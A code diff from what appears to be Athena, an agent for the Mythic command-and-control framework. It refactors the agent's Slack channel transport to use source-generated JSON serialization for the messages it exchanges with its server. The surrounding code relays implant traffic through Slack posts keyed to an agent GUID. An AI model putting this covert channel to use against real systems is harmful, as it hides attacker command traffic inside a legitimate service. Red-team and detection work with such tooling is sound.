@@ -16,6 +16,8 @@ using Slack.NetStandard.WebApi.Files;
 using Slack.NetStandard.Messages.Blocks;
 using Slack.NetStandard.WebApi.Conversations;
 using System.Text.Json;
+using Athena.Models.Mythic.Checkin;
+using System.Text.Json.Serialization;
 
 namespace Athena
 {
@@ -198,7 +200,7 @@ namespace Athena
                 {
                     Channels = this.channel,
                     Title = "",
-                    InitialComment = JsonSerializer.Serialize(msg),
+                    InitialComment = JsonSerializer.Serialize(msg, MythicMessageWrapperJsonContext.Default.MythicMessageWrapper),
                     Content = data,
                     Filetype = "txt"
                 };
@@ -225,7 +227,7 @@ namespace Athena
 
                 request.Blocks.Add(new Section
                 {
-                    Text = new PlainText(JsonSerializer.Serialize(msg))
+                    Text = new PlainText(JsonSerializer.Serialize(msg, MythicMessageWrapperJsonContext.Default.MythicMessageWrapper))
                 });
 
 
@@ -272,7 +274,7 @@ namespace Athena
                         {
                             if (message.Text.Contains(this.agent_guid))
                             {
-                                MythicMessageWrapper mythicMessage = JsonSerializer.Deserialize<MythicMessageWrapper>(message.Text);
+                                MythicMessageWrapper mythicMessage = JsonSerializer.Deserialize<MythicMessageWrapper>(message.Text, MythicMessageWrapperJsonContext.Default.MythicMessageWrapper);
 
                                 if (!mythicMessage.to_server && mythicMessage.sender_id == this.agent_guid)
                                 {
@@ -314,5 +316,9 @@ namespace Athena
         public bool to_server { get; set; }
         public int id { get; set; }
         public bool final { get; set; }
+    }
+    [JsonSerializable(typeof(MythicMessageWrapper))]
+    public partial class MythicMessageWrapperJsonContext : JsonSerializerContext
+    {
     }
 }
